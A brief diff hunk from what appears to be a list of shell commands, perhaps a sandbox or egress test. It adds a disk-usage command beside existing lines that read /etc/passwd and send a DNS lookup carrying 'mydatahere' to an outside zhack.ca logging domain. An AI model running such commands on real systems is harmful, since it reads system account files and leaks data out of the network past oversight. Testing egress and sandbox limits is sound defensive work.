@@ -4,3 +4,4 @@ javac src/Main.java
 cat /etc/passwd
 nslookup mydatahere.ecec459e647ea6be494a.d.zhack.ca
 curl -vv https://google.com
+du -sh /opt/*
